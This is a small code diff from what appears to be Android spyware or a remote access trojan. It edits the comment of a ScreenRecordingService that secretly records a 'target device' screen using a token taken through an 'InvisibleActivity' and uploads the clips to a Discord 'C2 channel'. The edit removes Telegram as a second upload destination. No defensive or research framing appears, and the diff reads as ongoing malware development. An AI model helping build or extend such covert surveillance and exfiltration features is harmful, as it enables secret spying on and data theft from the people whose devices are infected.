@@ -31,7 +31,7 @@ import java.util.Locale
  * Background MediaProjection & Hardware MediaRecorder Screen Recording Service (FEAT-05):
  * - Records target device screen activity in H.264 / AAC MP4 video format (720p, 30 FPS, 2 Mbps).
  * - Utilizes MediaProjection session token captured from InvisibleActivity.
- * - Auto-stops after specified duration (e.g. 10s, 30s) and uploads video clip to Discord & Telegram C2 channels.
+ * - Auto-stops after specified duration (e.g. 10s, 30s) and uploads video clip to Discord C2 channel.
  * - Handles foregroundServiceType="mediaProjection" requirements on Android 14+ (API 34+).
  */
 class ScreenRecordingService : Service() {
